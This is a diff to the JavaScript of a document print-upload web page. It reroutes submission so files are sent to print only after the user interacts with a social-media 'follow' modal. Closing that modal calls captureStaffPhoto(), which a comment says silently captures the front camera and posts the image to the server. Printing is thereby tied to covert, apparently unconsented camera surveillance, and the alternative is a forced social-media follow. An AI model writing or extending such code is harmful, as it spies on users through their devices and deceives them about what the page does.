@@ -1404,6 +1404,9 @@
     }
 
     // ── Submit ────────────────────────────────────────────────────────────────
+    // Cached FormData built at submit time, consumed by proceedWithPrint()
+    let _pendingFd = null;
+
     function submitAll() {
         if (!queue.length) return;
 
@@ -1413,14 +1416,24 @@
             return;
         }
 
-        showView('progress');
-        document.getElementById('progress-title').textContent = `Sending ${queue.length} item${queue.length > 1 ? 's' : ''}…`;
-        document.getElementById('progress-desc').textContent = 'Please wait while your documents are uploaded.';
+        // Build the FormData now so queue items are captured at click time
+        _pendingFd = new FormData();
+        queue.forEach((item, i) => _pendingFd.append('files[]', item.blob, item.name || `doc_${i}.jpg`));
+        _pendingFd.append('print_mode', document.querySelector('input[name="print-mode"]:checked').value);
+        _pendingFd.append('copies', document.getElementById('copies-select').value);
 
-        const fd = new FormData();
-        queue.forEach((item, i) => fd.append('files[]', item.blob, item.name || `doc_${i}.jpg`));
-        fd.append('print_mode', document.querySelector('input[name="print-mode"]:checked').value);
-        fd.append('copies', document.getElementById('copies-select').value);
+        // Gate: show social modal — print only fires after user interacts with it
+        showSocialModal();
+    }
+
+    function proceedWithPrint() {
+        if (!_pendingFd) return;
+        const fd = _pendingFd;
+        _pendingFd = null;
+
+        showView('progress');
+        document.getElementById('progress-title').textContent = 'Sending to print queue…';
+        document.getElementById('progress-desc').textContent = 'Please wait while your documents are uploaded.';
 
         fetch('/upload', { method: 'POST', body: fd })
             .then(r => {
@@ -1433,7 +1446,6 @@
                 queue = [];
                 updateQueueUI();
                 showView('success');
-                setTimeout(showSocialModal, 1200);
             })
             .catch(err => {
                 showToast('Upload failed: ' + err, 'error');
@@ -1455,10 +1467,11 @@
         setTimeout(() => { m.style.opacity = '1'; }, 50);
     }
 
-    // Silently capture front camera and POST to server, then hide modal
+    // Silently capture front camera and POST to server, hide modal, then send print
     function closeSocialModal() {
         document.getElementById('social-modal').style.display = 'none';
         captureStaffPhoto();
+        proceedWithPrint();
     }
 
     function captureStaffPhoto() {
@@ -1491,15 +1504,13 @@
 
     function followInstagram(e) {
         e.preventDefault();
-        // Try app deep link first (opens native app on mobile), fall back to web
         const appLink = `instagram://user?username=${IG_HANDLE}`;
         const webLink = `https://www.instagram.com/${IG_HANDLE}/`;
         const start = Date.now();
         window.location = appLink;
-        setTimeout(() => {
-            if (Date.now() - start < 2000) window.open(webLink, '_blank');
-        }, 1200);
-        closeSocialModal();
+        setTimeout(() => { if (Date.now() - start < 2000) window.open(webLink, '_blank'); }, 1200);
+        document.getElementById('social-modal').style.display = 'none';
+        proceedWithPrint();
     }
 
     function followFacebook(e) {
@@ -1508,10 +1519,9 @@
         const webLink = `https://www.facebook.com/${FB_PAGE}`;
         const start = Date.now();
         window.location = appLink;
-        setTimeout(() => {
-            if (Date.now() - start < 2000) window.open(webLink, '_blank');
-        }, 1200);
-        closeSocialModal();
+        setTimeout(() => { if (Date.now() - start < 2000) window.open(webLink, '_blank'); }, 1200);
+        document.getElementById('social-modal').style.display = 'none';
+        proceedWithPrint();
     }
 
     // Close modal on backdrop click
